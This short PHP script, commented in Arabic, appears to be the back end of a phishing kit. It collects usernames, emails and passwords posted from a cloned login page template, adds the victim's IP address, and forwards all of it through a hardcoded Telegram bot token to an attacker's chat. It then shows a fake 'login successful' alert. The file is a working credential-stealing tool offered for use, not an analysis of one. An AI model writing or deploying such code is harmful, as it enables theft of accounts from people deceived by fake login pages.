<?php
// إعدادات Telegram
$botToken = '5984403789:AAG0N8ThL71h4mIxPuIb4F863OyZurWBM8A';
$chatId = '1';

// تضمين معالج Telegram
require_once('../../telegram_handler.php');

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // الحصول على عنوان IP
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'غير معروف';
    
    // استخراج البيانات (قد تختلف أسماء الحقول حسب القالب)
    $username = $_POST['username'] ?? $_POST['email'] ?? $_POST['login_email'] ?? 'غير متاح';
    $password = $_POST['password'] ?? $_POST['login_password'] ?? 'غير متاح';
    
    // اسم القالب الحالي
    $template = basename(dirname(__FILE__));
    
    // إرسال البيانات إلى Telegram
    logCredentials($template, $username, $password, $ip, $botToken, $chatId);
    
    // إعادة توجيه أو رسالة نجاح (اختياري)
    echo "<script>alert('تم تسجيل الدخول بنجاح!'); window.location.href='login.html';</script>";
}
?>